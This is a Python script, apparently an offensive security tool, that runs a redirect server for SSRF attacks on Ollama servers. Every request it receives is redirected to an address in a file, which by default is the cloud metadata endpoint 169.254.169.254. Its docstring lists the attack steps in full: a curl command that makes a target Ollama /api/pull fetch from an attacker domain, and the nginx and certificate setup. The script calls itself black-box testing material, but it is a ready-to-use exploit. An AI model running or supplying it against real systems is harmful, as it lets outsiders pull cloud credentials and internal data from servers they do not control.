#!/usr/bin/env python3
"""
SSRF Domain Oracle Server for Ollama Black-Box Testing.

Runs on a VPS behind nginx (port 7777, proxied from 443).
Reads redirect target from /tmp/ssrf_target.
All requests are redirected to the target URL.

Usage:
  1. Start: python3 ssrf_domain_oracle.py
  2. Set target: echo 'http://169.254.169.254/latest/meta-data/instance-id' > /tmp/ssrf_target
  3. Trigger SSRF: curl -X POST http://<ollama>:11434/api/pull \
       -d '{"name": "oracle.yourdomain.com/library/fake:latest", "stream": false}'

Requirements:
  - Domain pointing to this VPS (A record, DNS only/no proxy)
  - nginx reverse proxy: 443 -> 127.0.0.1:7777
  - SSL cert (letsencrypt): certbot certonly --nginx -d oracle.yourdomain.com
"""

import json, sys, os
from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = 7777
TARGET_FILE = '/tmp/ssrf_target'

if not os.path.exists(TARGET_FILE):
    with open(TARGET_FILE, 'w') as f:
        f.write('http://169.254.169.254/latest/meta-data/')


def get_target():
    with open(TARGET_FILE) as f:
        return f.read().strip()


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        target = get_target()
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()
        print(f'[REDIRECT] {self.path} -> {target}', flush=True)

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        self.send_response(302)
        self.send_header('Location', get_target())
        self.end_headers()

    def log_message(self, *a):
        pass


if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', PORT), Handler)
    print(f'[*] SSRF domain oracle on port {PORT}', flush=True)
    print(f'[*] Target file: {TARGET_FILE}', flush=True)
    print(f'[*] Current target: {get_target()}', flush=True)
    server.serve_forever()
